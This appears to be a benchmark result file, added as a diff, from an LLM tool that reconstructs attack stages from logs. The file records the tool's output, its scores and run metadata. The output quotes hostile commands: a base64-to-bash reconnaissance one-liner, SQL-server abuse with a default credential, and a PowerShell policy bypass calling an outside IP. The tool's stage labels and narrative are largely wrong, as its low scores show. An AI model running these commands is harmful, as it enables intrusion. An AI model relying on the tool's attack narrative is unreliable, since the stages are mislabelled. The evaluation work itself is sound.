@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sqltool_amd64_u --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attack starts with an initial access via base64 encoded commands executed through Bash. The adversary establishes persistence using SQLTool to execute various actions such as enabling services, executing PowerShell scripts for discovery purposes, and attempting privilege escalation by running commands like `whoami`. These activities suggest attempts to gain deeper access, discover the network, and maintain their presence.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 53189,
+      "completion_tokens": 1541,
+      "total_tokens": 54730,
+      "wall_clock_s": 20.101,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.4,
+      "recall": 0.2857142857142857,
+      "f1": 0.3333333333333333,
+      "tp": 2,
+      "fp": 3,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.2,
+      "recall": 0.14285714285714285,
+      "f1": 0.16666666666666666,
+      "tp": 1,
+      "fp": 4,
+      "fn": 6,
+      "recall_partial": 0.21428571428571427
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 53189,
+      "completion_tokens": 1541,
+      "total_tokens": 54730,
+      "wall_clock_s": 20.101,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
